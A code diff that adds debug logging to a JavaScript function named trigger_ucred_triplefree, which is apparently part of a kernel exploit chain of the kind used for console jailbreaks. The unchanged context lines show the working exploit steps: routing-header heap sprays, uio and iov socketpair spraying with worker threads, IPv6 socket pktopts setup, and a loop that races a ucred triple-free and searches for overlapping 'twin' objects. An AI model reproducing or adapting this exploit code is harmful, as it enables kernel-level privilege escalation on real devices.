@@ -1274,49 +1274,61 @@ function trigger_ucred_triplefree() {
   var end = false;
   // Prepare spray buffer.
   spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
+  log("build_rthdr done, len = " + spray_rthdr_len);
 
   // Prepare msg iov buffer.
   write64(msg.add(0x10), msgIov);        // msg_iov
   write64(msg.add(0x18), MSG_IOV_NUM);   // msg_iovlen
+  log("msg_iov prepared");
 
   // Dummy buffer for uio iov.
   var dummyBuffer = malloc(0x1000);
   memset(dummyBuffer, 0x41, 0x1000);
+  log("dummyBuffer allocated at " + dummyBuffer);
 
   // Set iov_base for uio read/write.
   write64(uioIovRead,  dummyBuffer);
   write64(uioIovWrite, dummyBuffer);
+  log("uioIovRead/uioIovWrite set");
 
   // Create socket pair for uio spraying.
   var uio_pair = socketpair(AF_UNIX, SOCK_STREAM, 0);
   uio_sock_0 = uio_pair[0];
   uio_sock_1 = uio_pair[1];
+  log("uio socketpair created: " + uio_sock_0 + ", " + uio_sock_1);
 
   // Create socket pair for iov spraying.
   var iov_pair = socketpair(AF_UNIX, SOCK_STREAM, 0);
   iov_sock_0 = iov_pair[0];
   iov_sock_1 = iov_pair[1];
+  log("iov socketpair created: " + iov_sock_0 + ", " + iov_sock_1);
 
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
     var worker = create_iov_worker(iovState);
     iov_recvmsg_workers[i] = worker;
+    log("iov worker " + i + " ready");
     worker.ready_flag = true;
   }
+
 
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     var worker = create_uio_worker(uioState);
     uio_readv_workers[i] = worker;
+    log("uio worker " + i + " ready");
     worker.ready_flag = true;
   }
+
 
   // Set up sockets for spraying.
   for (var i = 0; i < ipv6_socks.length; i++) {
     ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+    log("ipv6_socks[" + i + "] = " + ipv6_socks[i]);
   }
 
   // Initialize pktopts.
   for (var i = 0; i < ipv6_socks.length; i++) {
     free_rthdr(ipv6_socks[i]);
+    log("free_rthdr on socket " + i);
   }
 
   var setBuf = malloc(8);
@@ -1324,6 +1336,7 @@ function trigger_ucred_triplefree() {
 
   write64(msgIov.add(0x00), 1n);     // iov_base
   write64(msgIov.add(0x08), 1n);     // iov_len (Int8.SIZE = 1)
+  log("msgIov base/len initialized");
 
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
@@ -1364,6 +1377,7 @@ function trigger_ucred_triplefree() {
 
     // 8) إيجاد التوأم
     end = find_twins();
+    log("find_twins() returned: " + end);
     if (!end) {
       twins[0] = -1;
       twins[1] = -1;
